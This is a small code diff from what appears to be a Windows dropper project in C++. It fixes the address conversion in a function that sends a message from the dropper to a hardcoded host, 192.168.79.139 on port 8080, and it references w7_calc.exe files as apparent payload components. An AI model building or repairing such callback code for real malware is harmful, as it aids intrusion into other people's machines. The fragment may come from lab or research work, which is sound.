@@ -92,7 +92,6 @@ std::wstring setup_name(std::wstring, bool);
 typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
 
 std::string message = "This is a message sent from the dropper";
-int result;
 
 // 1 w7_calc.exe
 // 2 w7_calc.exe.mui
@@ -203,7 +202,13 @@ int send_message(std::string client_message) {
 	sockaddr_in client_addr{};
 	client_addr.sin_family = AF_INET;
 	client_addr.sin_port = htons(8080);
-	client_addr.sin_addr.s_addr = htonl("192.168.79.139");
+
+	if (inet_pton(AF_INET, "192.168.79.139", &client_addr.sin_addr) != 1) {
+		std::cerr << "inet_pton failed";
+		closesocket(client_connect);
+		WSACleanup();
+		return 1;
+	}
 
 	if (connect(client_connect, reinterpret_cast<sockaddr*>(&client_addr), sizeof(client_addr)) == SOCKET_ERROR){
 		std::cerr << "Connection failed: " << WSAGetLastError();
